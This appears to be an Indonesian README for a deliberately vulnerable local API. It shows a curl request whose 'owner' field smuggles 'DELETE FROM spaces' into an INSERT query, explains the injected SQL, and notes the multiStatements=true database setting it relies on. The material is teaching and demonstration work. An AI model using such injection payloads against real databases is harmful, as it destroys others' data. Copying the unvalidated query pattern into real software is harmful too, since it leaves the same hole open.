# Vulnerable API

## Reproduce

Hit api dengan data

```
curl --location --request POST 'localhost:4567/spaces' \
--header 'Content-Type: application/json' \
--data-raw '{
    "name": "test",
    "owner": "'\''); DELETE FROM spaces;  ## "
}'
```

Data diatas akan berdampak mengerikan. Data dalam table space akan terhapus semua.

### Penjelasan

Dengan data seperti itu dan input tidak divalidasi maka akan membentuk query seperti ini

```sql
INSERT INTO spaces(name, owner) VALUES('test',''); DELETE FROM spaces;  ## ')
```

Artinya, kita seharusnya hanya menjalankan query insert. Tapi karena tidak divalidasi inputannya.
Penyerang bisa menyisipi statement lain yang dapat merusak data kita.

## Note

untuk me-reproduce issue koneksi ke db harus disetmultistatement=true

```bash
root:root@tcp(127.0.0.1:3306)/natter?multiStatements=true
```

